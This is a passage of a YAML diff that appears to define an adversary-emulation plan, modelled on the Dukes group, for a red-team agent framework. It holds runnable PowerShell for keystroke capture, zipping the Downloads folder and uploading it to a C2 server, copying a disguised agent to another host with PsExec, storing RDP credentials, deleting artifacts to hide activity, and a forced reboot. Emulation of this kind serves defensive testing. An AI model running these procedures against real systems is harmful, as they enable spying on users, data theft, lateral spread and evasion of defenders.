+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_collection
+  procedure_step: "7.A.4"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+            write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+            exit 1;
+          }
+          Set-Location -path "C:\Program Files\SysinternalsSuite";
+          . .\psversion.ps1;
+          Get-Keystrokes;
+          Start-Sleep -Seconds 15;
+          View-Job -JobName "Keystrokes";
+
+  executors:
+  - name: powershell
+    command: |
+      if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+        write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+        exit 1;
+      }
+      Set-Location -path "C:\Program Files\SysinternalsSuite";
+      . .\psversion.ps1;
+      Get-Keystrokes;
+      Start-Sleep -Seconds 15;
+      View-Job -JobName "Keystrokes";
+
+- id: a612311d-a802-48da-bb7f-88a4b9dd7a24
+  name: Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)
+  description: Compress all data within Download directory and exfiltrate the results.
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: "Exfiltration Over C2 Channel"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_exfiltration
+  procedure_step: "7.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Write-Host "[*] Compressing all the things in download dir";
+          Compress-Archive -Path "C:\Users\#{profile_user}\Downloads\*.*" -DestinationPath "$env:APPDATA\OfficeSupplies.zip";
+
+          Import-Module .\upload.ps1 -Verbose -Force;
+          Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/file/upload";
+          if ($?) {
+            write-host "[+] Data exfil of download directory completed!";
+          } else {
+            write-host "[!] Data exfil failed!";
+          }
+
+        payloads:
+        - upload.ps1
+
+  input_arguments:
+    profile_user:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+      Write-Host "[*] Compressing all the things in download dir";
+      Compress-Archive -Path "C:\Users\#{profile_user}\Downloads\*.*" -DestinationPath "$env:APPDATA\OfficeSupplies.zip";
+
+      Import-Module .\upload.ps1 -Verbose -Force;
+      Invoke-MultipartFormDataUpload -InFile "$env:APPDATA\OfficeSupplies.zip" -Uri "#{server}/file/upload";
+      if ($?) {
+        write-host "[+] Data exfil of download directory completed!";
+      } else {
+        write-host "[!] Data exfil failed!";
+      }
+
+# Step 8 - Lateral Movement
+
+# Where is "Copy payload to webdav share:"
+
+- id: 95564347-e77a-4a89-b08f-dcafa5468f2c
+  name: Remote System Discovery (T1018)
+  description: Custom PowerShell script to perform AD triage for domain bound computers.
+  tactic: execution
+  technique:
+    attack_id: T1059.001
+    name: "Command and Scripting Interpreter: PowerShell"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_execution
+  procedure_step: "8.A.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+            write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+            exit 1;
+          }
+
+          Set-Location -path "C:\Program Files\SysinternalsSuite";
+          . .\psversion.ps1;
+          Ad-Search Computer Name *;
+
+  executors:
+  - name: powershell
+    command: |
+      if (! $(test-path -path "C:\Program Files\SysinternalsSuite")) {
+        write-host "[!] The path C:\Program Files\SysinternalsSuite does not exist. Execution has stopped.";
+        exit 1;
+      }
+
+      Set-Location -path "C:\Program Files\SysinternalsSuite";
+      . .\psversion.ps1;
+      Ad-Search Computer Name *;
+
+- id: c4a59e39-53b0-4ace-9528-8ff052752ece
+  name: Identifying current user on other machines
+  description: Custom PowerShell script to perform AD triage for domain bound computers.
+  tactic: execution
+  technique:
+    attack_id: T1059.001
+    name: "Command and Scripting Interpreter: PowerShell"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_execution
+  procedure_step: "8.A.2"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Invoke-Command -ComputerName "$(hostname)" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;
+
+  executors:
+  - name: powershell
+    command: |
+      Invoke-Command -ComputerName "$(hostname)" -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId -Last 1;
+
+- id: bddc0abc-07a0-41b7-813f-e0c64d9226b3
+  name: Copy Sandcat File
+  description: Copy Sandcat file using PsExec
+  tactic: lateral-movement
+  technique:
+    attack_id: T1105
+    name: "Ingress Tool Transfer"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_lat_movement
+  procedure_step: "8.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          move-item sandcat.go-windows-upx C:\Windows\temp\python.exe -force;
+          set-location "C:\Program Files\SysinternalsSuite\";
+          .\PsExec64.exe -accepteula \\#{pivot_machine_hostname} -i #{user.session.id} -d -f -c "C:\Windows\Temp\python.exe" -group "day-1-lateral-movement" -server "#{server}";
+          tasklist /S #{pivot_machine_hostname} /FI "IMAGENAME eq python.exe";
+        payloads:
+        - sandcat.go-windows-upx
+
+  input_arguments:
+    pivot_machine_hostname:
+      description: Hostname of pivot machine
+      type: string
+      default: pivothost
+
+    user.session.id:
+      description: Session id for user
+      type: string
+      default: "1"
+
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+
+- id: 00446217-53ca-4749-bacd-f41fe189d36e
+  name: Startup Folder Persistence Execution
+  description: Sets credentials for a headless RDP session to spawn triggering startup folder persistence.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1037.005
+    name: "Boot or Logon Initialization Scripts: Startup Items"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_lat_movement
+  procedure_step: "10.B"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
+          mstsc /v:127.0.0.2;
+          sleep 10;
+          Get-Process -name mstsc;
+          if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}
+
+  input_arguments:
+    profile_user:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+    profile_user_password:
+      description: Password of profile user
+      type: string
+      default: Password123!
+
+  executors:
+  - name: powershell
+    command: |
+      cmdkey /add:127.0.0.2 /user:#{profile_user} /pass:#{profile_user_password};
+      mstsc /v:127.0.0.2;
+      sleep 10;
+      Get-Process -name mstsc;
+      if ($?) { taskkill.exe /F /IM mstsc.exe; exit 0; } else {exit 1;}
+
+- id: 4bedbd9b-a570-4f9f-b78a-2f7f99ad5e92
+  name: Artifact Cleanup
+  description: Delete file artifacts left from the operation.
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal on Host: File Deletion"
+  cti_source: "https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments"
+  procedure_group: procedure_def_evasion
+  procedure_step: "10.A.3"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Remove-Item -Path "$env:USERPROFILE\Downloads\*.pfx" -Force;
+          Remove-Item -Path "$env:USERPROFILE\Downloads\*.bmp" -Force;
+          Remove-Item -Path "$env:USERPROFILE\Downloads\*.png" -Force;
+          if (test-path -path "$env:APPDATA\OfficeSupplies.7z") {
+              Remove-Item -Path "$env:APPDATA\OfficeSupplies.7z" -Force; write-host "[+] Successfully removed OfficeSupplies.7z";
+          } else {
+              write-host "[!] File did not exist to be removed!";
+          }
+
+          if (get-job -name "Keystrokes" -ErrorAction SilentlyContinue) {
+              Remove-Job -Name "Keystrokes";
+              if ($?) {
+                  write-host "[+] Job \"Keystrokes\" was remove.";
+              }
+          } else {
+              write-host "[!] Job \"Keystrokes\" did not exist.";
+          }
+
+          if (get-job -Name "Screenshot" -ErrorAction SilentlyContinue) {
+              Remove-Job -Name "Screenshot" -Force;
+              write-host "[+] Job \"screenshot\" was removed.";
+          } else {
+              write-host "[*] Job \"screenshot\" does not exist, thus was not removed.";
+          }
+          remove-item upload.ps1 -Force;
+
+  executors:
+  - name: powershell
+    command: |
+      Remove-Item -Path "$env:USERPROFILE\Downloads\*.pfx" -Force;
+      Remove-Item -Path "$env:USERPROFILE\Downloads\*.bmp" -Force;
+      Remove-Item -Path "$env:USERPROFILE\Downloads\*.png" -Force;
+      if (test-path -path "$env:APPDATA\OfficeSupplies.7z") {
+          Remove-Item -Path "$env:APPDATA\OfficeSupplies.7z" -Force; write-host "[+] Successfully removed OfficeSupplies.7z";
+      } else {
+          write-host "[!] File did not exist to be removed!";
+      }
+
+      if (get-job -name "Keystrokes" -ErrorAction SilentlyContinue) {
+          Remove-Job -Name "Keystrokes";
+          if ($?) {
+              write-host "[+] Job \"Keystrokes\" was remove.";
+          }
+      } else {
+          write-host "[!] Job \"Keystrokes\" did not exist.";
+      }
+
+      if (get-job -Name "Screenshot" -ErrorAction SilentlyContinue) {
+          Remove-Job -Name "Screenshot" -Force;
+          write-host "[+] Job \"screenshot\" was removed.";
+      } else {
+          write-host "[*] Job \"screenshot\" does not exist, thus was not removed.";
+      }
+      remove-item upload.ps1 -Force;
+
+# Step 10 - Persistence Execution
+
+- id: 4b2e9574-b1a7-4b38-95b2-6054ded9c4fe
+  name: Scheduled Task
+  description: Reboot the machine to aid in peristence callbacks
+  tactic: impact
+  technique:
+    attack_id: T1529
+    name: "System Shutdown/Reboot"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_impact
+  procedure_step: "10.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          write-host "[*] Restarting Computer";
+          Restart-Computer -Force;
+
+  executors:
+  - name: powershell
+    command: |
+      write-host "[*] Restarting Computer";
+      Restart-Computer -Force;
